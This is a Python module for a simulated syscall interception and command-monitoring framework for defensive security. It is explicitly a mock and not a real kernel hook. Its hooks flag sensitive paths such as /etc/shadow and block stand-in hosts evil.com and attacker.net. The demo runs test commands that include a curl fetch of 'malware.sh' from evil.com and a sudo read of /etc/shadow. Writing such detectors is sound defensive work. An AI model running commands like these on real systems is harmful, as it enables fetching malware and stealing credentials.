"""
System Call Interception Framework

Provides kernel-level command interception for holographic defense.
NOTE: This is a simulation/mock for demonstration purposes.
Real implementation would require kernel modules or eBPF.
"""

import logging
import time
from collections.abc import Callable
from dataclasses import dataclass
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class SyscallType(Enum):
    """Common system call types"""

    OPEN = "open"
    READ = "read"
    WRITE = "write"
    EXEC = "exec"
    FORK = "fork"
    SOCKET = "socket"
    CONNECT = "connect"
    SETUID = "setuid"
    KILL = "kill"
    MOUNT = "mount"


@dataclass
class SyscallEvent:
    """Captured system call event"""

    timestamp: float
    pid: int
    uid: int
    syscall_type: SyscallType
    args: list[Any]
    return_value: int
    metadata: dict[str, Any]


class SyscallInterceptor:
    """
    System call interception framework

    In production, this would use:
    - Linux: eBPF, kernel modules, or ptrace
    - Windows: Kernel drivers, hooks
    - macOS: Endpoint Security Framework

    For demo: Simulates interception at process level
    """

    def __init__(self):
        self.hooks: dict[SyscallType, list[Callable]] = {}
        self.events: list[SyscallEvent] = []
        self.enabled = False

        logger.info("=" * 70)
        logger.info("SYSTEM CALL INTERCEPTION FRAMEWORK")
        logger.info("Mode: SIMULATION (Demo)")
        logger.info("=" * 70)
        logger.info("NOTE: Production would use eBPF/kernel modules")
        logger.info("      This is a high-level simulation for demonstration")
        logger.info("=" * 70)

    def register_hook(self, syscall_type: SyscallType, callback: Callable):
        """Register a hook for specific syscall type"""
        if syscall_type not in self.hooks:
            self.hooks[syscall_type] = []

        self.hooks[syscall_type].append(callback)
        logger.info(f"Registered hook for {syscall_type.value}")

    def enable(self):
        """Enable interception"""
        self.enabled = True
        logger.info("✅ System call interception ENABLED")

    def disable(self):
        """Disable interception"""
        self.enabled = False
        logger.info("⚠️  System call interception DISABLED")

    def intercept(self, event: SyscallEvent) -> bool:
        """
        Intercept a system call

        Returns:
            True if allowed, False if blocked
        """
        if not self.enabled:
            return True

        # Log event
        self.events.append(event)

        # Execute hooks
        if event.syscall_type in self.hooks:
            for hook in self.hooks[event.syscall_type]:
                result = hook(event)
                if result is False:
                    logger.warning(f"🚫 Syscall blocked: {event.syscall_type.value}")
                    return False

        return True

    def get_events(
        self, syscall_type: SyscallType | None = None, since: float | None = None
    ) -> list[SyscallEvent]:
        """Get captured events"""
        events = self.events

        if syscall_type:
            events = [e for e in events if e.syscall_type == syscall_type]

        if since:
            events = [e for e in events if e.timestamp >= since]

        return events


class CommandInterceptionBridge:
    """
    Bridge between shell commands and syscall interception

    Translates high-level commands into syscall patterns for analysis
    """

    COMMAND_SYSCALL_MAP = {
        "cat": [SyscallType.OPEN, SyscallType.READ],
        "ls": [SyscallType.OPEN, SyscallType.READ],
        "cp": [SyscallType.OPEN, SyscallType.READ, SyscallType.WRITE],
        "mv": [SyscallType.OPEN, SyscallType.WRITE],
        "rm": [SyscallType.OPEN],
        "sudo": [SyscallType.SETUID],
        "ssh": [SyscallType.SOCKET, SyscallType.CONNECT],
        "wget": [SyscallType.SOCKET, SyscallType.CONNECT, SyscallType.WRITE],
        "curl": [SyscallType.SOCKET, SyscallType.CONNECT],
        "nc": [SyscallType.SOCKET, SyscallType.CONNECT],
        "bash": [SyscallType.FORK, SyscallType.EXEC],
        "sh": [SyscallType.FORK, SyscallType.EXEC],
    }

    def __init__(self, interceptor: SyscallInterceptor):
        self.interceptor = interceptor
        logger.info("Command-to-Syscall bridge initialized")

    def analyze_command(self, command: str, user_id: int) -> list[SyscallEvent]:
        """
        Analyze command and generate expected syscall events

        This is a simulation - real implementation would capture actual syscalls
        """
        parts = command.split()
        if not parts:
            return []

        base_cmd = parts[0]
        args = parts[1:]

        # Generate syscall events based on command
        events = []

        if base_cmd in self.COMMAND_SYSCALL_MAP:
            syscalls = self.COMMAND_SYSCALL_MAP[base_cmd]

            for syscall_type in syscalls:
                event = SyscallEvent(
                    timestamp=time.time(),
                    pid=user_id * 1000,  # Simulated PID
                    uid=user_id,
                    syscall_type=syscall_type,
                    args=args,
                    return_value=0,  # Success
                    metadata={"command": command, "simulated": True},
                )

                # Check with interceptor
                allowed = self.interceptor.intercept(event)

                if not allowed:
                    event.return_value = -1  # Blocked
                    events.append(event)
                    break  # Stop processing

                events.append(event)

        return events


class KernelHookSimulator:
    """
    Simulates kernel-level hooks for demonstration

    In production, this would be actual kernel code or eBPF programs
    """

    def __init__(self):
        self.interceptor = SyscallInterceptor()
        self.bridge = CommandInterceptionBridge(self.interceptor)
        self.security_rules: list[dict[str, Any]] = []

        # Install default security hooks
        self._install_default_hooks()

        logger.info("Kernel Hook Simulator ready")

    def _install_default_hooks(self):
        """Install default security hooks"""

        # Hook: Block unauthorized SETUID
        def block_unauthorized_setuid(event: SyscallEvent) -> bool:
            if event.uid != 0 and "sudo" in str(event.args):
                logger.warning(f"⚠️  Unauthorized SETUID attempt from UID {event.uid}")
                return False  # Block
            return True

        self.interceptor.register_hook(SyscallType.SETUID, block_unauthorized_setuid)

        # Hook: Monitor sensitive file access
        def monitor_sensitive_files(event: SyscallEvent) -> bool:
            sensitive_paths = ["/etc/shadow", "/etc/passwd", "/root/", "/sys/"]

            for arg in event.args:
                if any(path in str(arg) for path in sensitive_paths):
                    logger.warning(f"⚠️  Sensitive file access: {arg}")
                    # Don't block, but log for analysis

            return True

        self.interceptor.register_hook(SyscallType.OPEN, monitor_sensitive_files)

        # Hook: Detect network exfiltration
        def detect_exfiltration(event: SyscallEvent) -> bool:
            # Check for suspicious network activity
            if "evil.com" in str(event.args) or "attacker.net" in str(event.args):
                logger.error(f"🚨 EXFILTRATION DETECTED: {event.args}")
                return False  # Block malicious connections

            return True

        self.interceptor.register_hook(SyscallType.CONNECT, detect_exfiltration)

    def process_command(self, command: str, user_id: int) -> dict[str, Any]:
        """
        Process command through syscall interception

        Returns analysis of syscall behavior
        """
        # Analyze command
        events = self.bridge.analyze_command(command, user_id)

        # Aggregate results
        result = {
            "command": command,
            "user_id": user_id,
            "syscalls_generated": len(events),
            "syscalls_blocked": sum(1 for e in events if e.return_value == -1),
            "events": events,
            "allowed": all(e.return_value == 0 for e in events),
        }

        return result

    def get_statistics(self) -> dict[str, Any]:
        """Get interception statistics"""
        all_events = self.interceptor.get_events()

        return {
            "total_syscalls": len(all_events),
            "blocked_syscalls": sum(1 for e in all_events if e.return_value == -1),
            "by_type": {
                syscall_type.value: len(
                    [e for e in all_events if e.syscall_type == syscall_type]
                )
                for syscall_type in SyscallType
            },
            "hooks_registered": sum(
                len(hooks) for hooks in self.interceptor.hooks.values()
            ),
        }


# Public API
__all__ = [
    "KernelHookSimulator",
    "SyscallInterceptor",
    "CommandInterceptionBridge",
    "SyscallType",
    "SyscallEvent",
]


# Demo/Test
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)

    print("\n" + "=" * 70)
    print("SYSTEM CALL INTERCEPTION - DEMO")
    print("=" * 70 + "\n")

    simulator = KernelHookSimulator()
    simulator.interceptor.enable()

    # Test commands
    test_commands = [
        "ls -la",
        "cat /etc/passwd",
        "sudo cat /etc/shadow",
        "curl http://evil.com/malware.sh",
        "wget https://normal-site.com/file.txt",
    ]

    for cmd in test_commands:
        print(f"\n[TEST] Command: {cmd}")
        result = simulator.process_command(cmd, user_id=1001)
        print(f"  Syscalls: {result['syscalls_generated']}")
        print(f"  Blocked: {result['syscalls_blocked']}")
        print(f"  Allowed: {result['allowed']}")

    print("\n" + "=" * 70)
    print("STATISTICS")
    print("=" * 70)
    stats = simulator.get_statistics()
    for key, value in stats.items():
        print(f"  {key}: {value}")
    print()
